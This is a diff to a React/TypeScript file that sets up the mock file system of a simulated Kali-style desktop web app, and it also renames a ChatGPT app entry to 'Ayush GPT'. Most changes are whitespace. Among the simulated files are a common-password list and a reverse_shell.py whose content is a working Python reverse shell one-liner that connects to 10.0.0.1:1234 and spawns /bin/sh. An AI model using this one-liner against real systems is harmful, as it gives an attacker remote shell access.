@@ -31,21 +31,21 @@ export const INITIAL_FILE_SYSTEM: FileSystemItem[] = [
             owner: 'yashika',
             group: 'yashika',
             children: [
-              { 
-                id: 'mission', 
-                name: 'mission_brief.txt', 
-                type: 'file', 
-                content: 'Target: 10.10.11.24\nObjective: Root\n\n1. Recon (Nmap)\n2. Enum (GoBuster)\n3. Exploit (CVE-2024-XXXX)\n4. PrivEsc', 
+              {
+                id: 'mission',
+                name: 'mission_brief.txt',
+                type: 'file',
+                content: 'Target: 10.10.11.24\nObjective: Root\n\n1. Recon (Nmap)\n2. Enum (GoBuster)\n3. Exploit (CVE-2024-XXXX)\n4. PrivEsc',
                 createdAt: Date.now(),
                 permissions: '-rw-r--r--',
                 owner: 'yashika',
                 group: 'yashika'
               },
-              { 
-                id: 'creds', 
-                name: 'wordlists.txt', 
-                type: 'file', 
-                content: 'admin\npassword\n123456\nroot\ntoor', 
+              {
+                id: 'creds',
+                name: 'wordlists.txt',
+                type: 'file',
+                content: 'admin\npassword\n123456\nroot\ntoor',
                 createdAt: Date.now(),
                 permissions: '-rw-r--r--',
                 owner: 'yashika',
@@ -83,15 +83,15 @@ export const INITIAL_FILE_SYSTEM: FileSystemItem[] = [
             owner: 'yashika',
             group: 'yashika',
             children: [
-              { 
-                id: 'rev-shell', 
-                name: 'reverse_shell.py', 
-                type: 'file', 
-                content: 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);', 
+              {
+                id: 'rev-shell',
+                name: 'reverse_shell.py',
+                type: 'file',
+                content: 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',
                 createdAt: Date.now(),
                 permissions: '-rwxr-xr-x',
                 owner: 'yashika',
-                group: 'yashika' 
+                group: 'yashika'
               },
             ]
           },
@@ -114,16 +114,16 @@ export const INITIAL_FILE_SYSTEM: FileSystemItem[] = [
             owner: 'yashika',
             group: 'yashika',
             children: [
-               { 
-                 id: 'note-1', 
-                 name: 'todo.md', 
-                 type: 'file', 
-                 content: '# TO DO\n- Update kernel\n- Scan network\n- Buy coffee', 
-                 createdAt: Date.now(),
-                 permissions: '-rw-r--r--',
-                 owner: 'yashika',
-                 group: 'yashika' 
-               }
+              {
+                id: 'note-1',
+                name: 'todo.md',
+                type: 'file',
+                content: '# TO DO\n- Update kernel\n- Scan network\n- Buy coffee',
+                createdAt: Date.now(),
+                permissions: '-rw-r--r--',
+                owner: 'yashika',
+                group: 'yashika'
+              }
             ]
           }
         ]
@@ -139,31 +139,31 @@ export const INITIAL_FILE_SYSTEM: FileSystemItem[] = [
     owner: 'root',
     group: 'root',
     children: [
-      { 
-        id: 'passwd', 
-        name: 'passwd', 
-        type: 'file', 
-        content: 'root:x:0:0:root:/root:/bin/bash\nyashika:x:1000:1000:yashika:/home/yashika:/bin/bash', 
+      {
+        id: 'passwd',
+        name: 'passwd',
+        type: 'file',
+        content: 'root:x:0:0:root:/root:/bin/bash\nyashika:x:1000:1000:yashika:/home/yashika:/bin/bash',
         createdAt: Date.now(),
         permissions: '-rw-r--r--',
         owner: 'root',
         group: 'root'
       },
-      { 
-        id: 'hostname', 
-        name: 'hostname', 
-        type: 'file', 
-        content: 'yashika-kali', 
+      {
+        id: 'hostname',
+        name: 'hostname',
+        type: 'file',
+        content: 'yashika-kali',
         createdAt: Date.now(),
         permissions: '-rw-r--r--',
         owner: 'root',
         group: 'root'
       },
-      { 
-        id: 'os-release', 
-        name: 'os-release', 
-        type: 'file', 
-        content: 'PRETTY_NAME="Yashika OS 2026"\nID=kali\nMAINTAINER="Ayush Upadhyay"', 
+      {
+        id: 'os-release',
+        name: 'os-release',
+        type: 'file',
+        content: 'PRETTY_NAME="Yashika OS 2026"\nID=kali\nMAINTAINER="Ayush Upadhyay"',
         createdAt: Date.now(),
         permissions: '-rw-r--r--',
         owner: 'root',
@@ -357,11 +357,11 @@ export const APP_REGISTRY = {
   },
   [AppID.CHATGPT]: {
     id: AppID.CHATGPT,
-    name: 'ChatGPT',
+    name: 'Ayush GPT',
     icon: <MessageCircle className="w-full h-full text-teal-500" />,
-    component: () => null,
-    defaultWidth: 800,
-    defaultHeight: 600,
+    component: React.lazy(() => import('./components/apps/AyushGPT')),
+    defaultWidth: 900,
+    defaultHeight: 700,
   },
   [AppID.CLOCK]: {
     id: AppID.CLOCK,
